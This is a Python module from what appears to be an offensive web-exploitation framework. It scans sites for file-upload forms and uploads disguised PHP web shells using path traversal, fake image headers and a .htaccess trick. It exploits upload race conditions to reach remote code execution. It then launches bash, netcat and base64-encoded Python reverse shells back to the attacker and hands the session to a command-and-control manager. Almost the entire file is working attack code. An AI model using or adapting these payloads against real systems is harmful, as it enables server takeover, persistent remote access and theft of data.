import aiohttp
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import socket
import random
import time
import base64
from core.c2_manager import c2_manager
from modules.payloads.generator import PayloadGenerator

# --- SMART PAYLOADS ---
PHP_SMART_SHELL = b"""<?php
$c=$_GET['c'];
if(function_exists('system')){system($c);}
elif(function_exists('shell_exec')){echo shell_exec($c);}
elif(function_exists('passthru')){passthru($c);}
elif(function_exists('exec')){$o=array();exec($c,$o);echo implode("\\n",$o);}
elif(function_exists('popen')){$h=popen($c,'r');while(!feof($h)){echo fread($h,2048);}pclose($h);}
elif(function_exists('proc_open')){$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=proc_open($c,$d,$P);if(is_resource($p)){while($s=fgets($P[1])){echo $s;}foreach($P as $X){fclose($X);}proc_close($p);}}
else{echo 'LOCKON_NO_EXEC';}
?>"""

PAYLOAD_CONCAT = b"<?php $x='sys'; $y='tem'; $z=$x.$y; $z($_GET['c']); ?>"
GIF_HEADER = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;\n'
PAYLOAD_GIF = GIF_HEADER + PHP_SMART_SHELL

DANGEROUS_EXTS = [".php", ".phtml", ".php5", ".phar", ".shtml"]
TRAVERSAL_PREFIXES = ["", "../", "..\\", ".../", "./"]

SHELL_PAYLOADS = []

from modules.exploit.shell_gen import WebShellGenerator
from modules.post_exploit.ghost_protocol import GhostProtocol

try:
    # 1. Generate Shell
    base_shell = WebShellGenerator.generate_webshell("php", "lockon")
    # 2. Add Self-Destruct (Ghost Protocol)
    gen_shell = GhostProtocol.wrap_self_destruct(base_shell, "php").encode()
except Exception:
    gen_shell = PHP_SMART_SHELL

for ext in DANGEROUS_EXTS:
    # 1. Generated Minimal Shell (Persistence + Self-Destruct)
    SHELL_PAYLOADS.append({"name": f"lockon{ext}", "content": gen_shell, "mime": "application/x-php"})
    # 2. Advanced Polyglot Shell (Execution)
    SHELL_PAYLOADS.append({"name": f"smart{ext}", "content": PHP_SMART_SHELL, "mime": "application/x-php"})
    # 3. Image Deception
    SHELL_PAYLOADS.append({"name": f"image{ext}.jpg", "content": PHP_SMART_SHELL, "mime": "image/jpeg"})

SHELL_PAYLOADS.append({"name": "logo.gif.php", "content": PAYLOAD_GIF, "mime": "image/gif"})
SHELL_PAYLOADS.append({"name": ".htaccess", "content": b"AddType application/x-httpd-php .jpg", "mime": "text/plain"})

BASIC_COMMANDS = [
    ("ver", "Windows Version", [r"Microsoft Windows"]),
    ("uname -a", "System Kernel", [r"Linux", r"Darwin"]),
    ("whoami", "User Identity", [r".+"])
]

def get_target_ip(url):
    try:
        hostname = urlparse(url).hostname
        if hostname in ["localhost", "127.0.0.1"]: return "127.0.0.1"
        return socket.gethostbyname(hostname)
    except Exception: return "127.0.0.1"

# [FIX] Smart LHOST: เชื่อมต่อกับ Target IP เพื่อหา Interface ที่ถูกต้อง
# แก้ปัญหา VPN Routing (ยิง VM ผ่าน Local LAN แต่ได้ IP VPN มาแทน)
def get_lhost(target_ip):
    if target_ip in ["127.0.0.1", "localhost", "::1"]: return "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # ลองเชื่อมต่อกับ Target จริงๆ (ไม่ได้ส่ง packet จริง แค่ถาม OS ว่าจะออกทางไหน)
        s.connect((target_ip, 80)) 
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        # Fallback ถ้าต่อ Target ไม่ได้ (เช่นโดนบล็อก ping) ก็ลอง 8.8.8.8
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

async def trigger_reverse_shell(session, shell_url, lhost, lport, os_type="linux"):
    rev_payloads = []
    
    # [FIX] Use Centralized Payload Generator
    if os_type == "windows":
        py_code = PayloadGenerator.generate_python_xor(lhost, lport)
        # Wrap in one-liner
        b64_code = base64.b64encode(py_code.encode()).decode()
        cmd = f"python -c \"exec(__import__('base64').b64decode('{b64_code}'))\""
        rev_payloads.append(cmd)
    else:
        rev_payloads.append(f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
        rev_payloads.append(f"nc -e /bin/sh {lhost} {lport}")
        py_code_linux = f"""
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{lhost}",{lport}))
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
except Exception: pass
"""
        b64_linux = base64.b64encode(py_code_linux.encode()).decode()
        rev_payloads.append(f"python3 -c \"exec(__import__('base64').b64decode('{b64_linux}'))\"")

    for cmd in rev_payloads:
        try:
            await session.get(f"{shell_url}?c={cmd}", ssl=False)
            await asyncio.sleep(0.5)
        except Exception: pass

async def race_check(session, url, payload_name):
    possible_dirs = ["uploads/", "images/", "files/", ""]
    attempts = []
    for d in possible_dirs:
        attempts.append(urljoin(url, f"{d}{payload_name}"))
    for _ in range(5):
        for target in attempts:
            try:
                await session.get(f"{target}?c=echo LOCKON_RACE_WIN", ssl=False)
            except Exception: pass
        await asyncio.sleep(0.1)

async def check_upload_rce(session, url, form_details):
    action = form_details.get("action")
    inputs = form_details.get("inputs", [])
    target_url = urljoin(url, action)
    findings = []
    
    for prefix in TRAVERSAL_PREFIXES:
        for payload in SHELL_PAYLOADS:
            traversal_name = f"{prefix}{payload['name']}"
            try:
                data = aiohttp.FormData()
                for inp in inputs:
                    if inp['type'] == 'file':
                        data.add_field(inp['name'], payload['content'], filename=traversal_name, content_type=payload['mime'])
                    else:
                        data.add_field(inp['name'], 'lockon_test')
                
                race_task = asyncio.create_task(race_check(session, url, payload['name']))
                
                async with session.post(target_url, data=data, timeout=10, ssl=False) as resp:
                    text = await resp.text()
                    
                    if resp.status == 200:
                        possible_paths = [
                            urljoin(url, f"uploads/{payload['name']}"),
                            urljoin(url, f"images/{payload['name']}"),
                            urljoin(url, f"files/{payload['name']}"),
                            urljoin(url, payload['name']),
                            urljoin(url, f"../{payload['name']}"), 
                            urljoin(url, f"../../{payload['name']}")
                        ]
                        
                        paths_in_resp = re.findall(r'src=["\'](.*?)["\']', text)
                        paths_in_resp += re.findall(r'href=["\'](.*?)["\']', text)
                        for p in paths_in_resp:
                            if payload['name'] in p: possible_paths.append(urljoin(url, p))

                        unique_paths = list(set(possible_paths))
                        
                        for shell_url in unique_paths:
                            try:
                                test_url = f"{shell_url}?c=echo LOCKON_RCE_CONFIRMED"
                                async with session.get(test_url, timeout=5, ssl=False) as check_resp:
                                    check_text = await check_resp.text()
                                    
                                    if "LOCKON_RCE_CONFIRMED" in check_text or "LOCKON_RACE_WIN" in check_text:
                                        
                                        full_evidence = f"Shell URL: {shell_url}\nPayload: {traversal_name}\n"
                                        if "LOCKON_RACE_WIN" in check_text: full_evidence += "[!] Race Condition Win!\n"
                                        
                                        detected_os = "linux" 
                                        for cmd, desc, sigs in BASIC_COMMANDS:
                                            try:
                                                exec_url = f"{shell_url}?c={cmd}"
                                                async with session.get(exec_url, timeout=5, ssl=False) as cmd_resp:
                                                    out = (await cmd_resp.text()).strip()[:200]
                                                    if "Microsoft Windows" in out: detected_os = "windows"
                                            except Exception: pass
                                        
                                        # บันทึก Finding
                                        findings.append({
                                            "type": "Remote Code Execution (C2 Active)",
                                            "severity": "Critical",
                                            "detail": f"Web Shell uploaded ({traversal_name}). Ready for C2 connection.",
                                            "evidence": full_evidence,
                                            "remediation": "Isolate system immediately.",
                                            "exploit_type": "upload_shell",
                                            "exploit_data": {"shell_url": shell_url, "os_type": detected_os}
                                        })
                                        return findings 
                            except Exception: pass
            
                # Ensure race task completes before leaving session scope
                if not race_task.done(): 
                    await race_task
            except Exception: pass
            
    return findings

# --- EXPLOIT HANDLER ---
async def launch_exploit(data):
    shell_url = data['shell_url']
    os_type = data['os_type']
    
    # [FIX] Get Smart LHOST based on target
    lhost = c2_manager.get_lhost_address(shell_url)
    lport = random.randint(10000, 20000)
    
    c2_manager.output_buffer += f"\n[*] Launching Reverse Shell from Web Shell...\n"
    c2_manager.output_buffer += f"[*] Target: {shell_url} | OS: {os_type}\n"
    c2_manager.output_buffer += f"[*] LHOST: {lhost} (Auto-detected based on route)\n"
    c2_manager.output_buffer += f"[*] Listener: 0.0.0.0:{lport}\n"
    
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.settimeout(10)
    
    try:
        server_sock.bind(('0.0.0.0', lport))
        server_sock.listen(1)
        
        async with aiohttp.ClientSession() as session:
            await trigger_reverse_shell(session, shell_url, lhost, lport, os_type)
        
        loop = asyncio.get_event_loop()
        client, addr = await loop.run_in_executor(None, server_sock.accept)
        
        if client:
            c2_manager.register_session(client, addr[0], os_type=os_type)
            return True, "Success"
    except socket.timeout:
        c2_manager.output_buffer += "[-] Socket Timeout. Switching to HTTP Mode.\n"
        c2_manager.register_http_session(shell_url, os_type=os_type)
        return True, "HTTP Fallback"
    except Exception as e:
        c2_manager.output_buffer += f"[-] Error: {e}\n"
    finally:
        server_sock.close()
        
    return False, "Failed"

async def run_upload_scan(target_url, crawled_urls, log_callback=None, headers=None):
    findings = []
    upload_pages = []
    async with aiohttp.ClientSession(headers=headers) as session:
        if log_callback: log_callback(f"📤 Hunting for File Upload forms...")
        urls_to_check = set(crawled_urls)
        urls_to_check.add(target_url)
        for url in list(urls_to_check)[:50]:
            try:
                async with session.get(url, timeout=5, ssl=False) as resp:
                    text = await resp.text()
                    if 'type="file"' in text: upload_pages.append(url)
            except Exception: pass
            
    if not upload_pages: return findings
    if log_callback: log_callback(f"   Found {len(upload_pages)} upload forms. Trying Smart RCE...")
    
    async with aiohttp.ClientSession(headers=headers) as session:
        for url in upload_pages:
            try:
                async with session.get(url, timeout=5, ssl=False) as resp:
                    html = await resp.text()
                    soup = BeautifulSoup(html, "html.parser")
                    forms = soup.find_all("form")
                    for form in forms:
                        if not form.find("input", {"type": "file"}): continue
                        details = {
                            "action": form.attrs.get("action", ""),
                            "inputs": [{"name": i.attrs.get("name"), "type": i.attrs.get("type", "text")} for i in form.find_all("input")]
                        }
                        res = await check_upload_rce(session, url, details)
                        findings.extend(res)
                        if res and log_callback: return findings 
            except Exception: pass
    return findings